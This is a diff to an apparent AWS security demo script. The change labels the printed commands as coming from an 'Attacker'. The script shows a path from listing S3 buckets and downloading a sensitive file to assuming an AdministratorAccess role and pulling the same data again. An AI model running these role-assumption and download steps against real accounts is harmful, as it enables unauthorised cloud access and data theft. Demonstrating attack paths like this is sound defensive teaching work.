@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -121,7 +123,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify user1 identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -133,7 +135,7 @@ echo -e "${GREEN}✓ Verified user1 identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -142,7 +144,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Listing all S3 buckets with user1${NC}"
 echo "User1 has direct S3 permissions..."
 
-show_attack_cmd "aws s3api list-buckets --query 'Buckets[*].Name' --output text"
+show_attack_cmd "Attacker" "aws s3api list-buckets --query 'Buckets[*].Name' --output text"
 BUCKETS=$(aws s3api list-buckets --query 'Buckets[*].Name' --output text)
 echo "Found buckets:"
 for bucket in $BUCKETS; do
@@ -159,7 +161,7 @@ echo -e "${YELLOW}Step 5: Accessing target bucket directly with user1${NC}"
 echo "Target bucket: $BUCKET_NAME"
 
 echo "Listing objects in bucket..."
-show_attack_cmd "aws s3 ls s3://$BUCKET_NAME/"
+show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"
 
@@ -168,7 +170,7 @@ echo -e "${YELLOW}Step 6: Reading sensitive data with user1${NC}"
 echo "Downloading sensitive-data.txt..."
 
 TEMP_FILE="/tmp/user1-sensitive-data.txt"
-show_attack_cmd "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $TEMP_FILE"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $TEMP_FILE"
 aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $TEMP_FILE
 
 echo -e "${GREEN}✓ Successfully downloaded file${NC}"
@@ -197,7 +199,7 @@ export AWS_REGION=$AWS_REGION
 unset AWS_SESSION_TOKEN
 
 # Verify user2 identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -211,7 +213,7 @@ echo -e "${GREEN}✓ Verified user2 identity${NC}\n"
 echo -e "${YELLOW}Step 8: Verifying user2 doesn't have direct S3 access${NC}"
 echo "Attempting to list buckets with user2..."
 
-show_cmd "aws s3api list-buckets --output text"
+show_cmd "Attacker" "aws s3api list-buckets --output text"
 if aws s3api list-buckets --output text &> /dev/null; then
     echo -e "${YELLOW}⚠ Unexpectedly can list buckets (user2 may have some S3 permissions)${NC}"
 else
@@ -219,7 +221,7 @@ else
 fi
 
 echo "Attempting to access target bucket directly..."
-show_cmd "aws s3 ls s3://$BUCKET_NAME/"
+show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
     echo -e "${YELLOW}⚠ Unexpectedly can access bucket (user2 may have direct access)${NC}"
 else
@@ -232,7 +234,7 @@ echo -e "${YELLOW}Step 9: Assuming role3 (admin role)${NC}"
 echo "Role ARN: $ROLE3_ARN"
 echo "This role has AdministratorAccess..."
 
-show_attack_cmd "aws sts assume-role --role-arn $ROLE3_ARN --role-session-name demo-admin-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE3_ARN --role-session-name demo-admin-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ROLE3_ARN \
     --role-session-name demo-admin-session \
@@ -246,7 +248,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 
@@ -260,7 +262,7 @@ echo -e "${GREEN}✓ Successfully assumed role3 (admin role)${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying admin permissions${NC}"
 echo "Testing administrative access with IAM ListUsers..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -274,7 +276,7 @@ echo ""
 echo -e "${YELLOW}Step 11: Listing all S3 buckets as admin${NC}"
 echo "Admin role has full S3 access via AdministratorAccess..."
 
-show_attack_cmd "aws s3api list-buckets --query 'Buckets[*].Name' --output text"
+show_attack_cmd "Attacker" "aws s3api list-buckets --query 'Buckets[*].Name' --output text"
 BUCKETS=$(aws s3api list-buckets --query 'Buckets[*].Name' --output text)
 echo "Found buckets:"
 for bucket in $BUCKETS; do
@@ -292,7 +294,7 @@ echo "Target bucket: $BUCKET_NAME"
 echo "Access is granted through AdministratorAccess policy..."
 
 echo "Listing objects in bucket..."
-show_attack_cmd "aws s3 ls s3://$BUCKET_NAME/"
+show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"
 
@@ -301,7 +303,7 @@ echo -e "${YELLOW}Step 13: Reading sensitive data via admin role${NC}"
 echo "Downloading sensitive-data.txt..."
 
 TEMP_FILE="/tmp/admin-sensitive-data.txt"
-show_attack_cmd "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $TEMP_FILE"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $TEMP_FILE"
 aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $TEMP_FILE
 
 echo -e "${GREEN}✓ Successfully downloaded file via admin role${NC}"
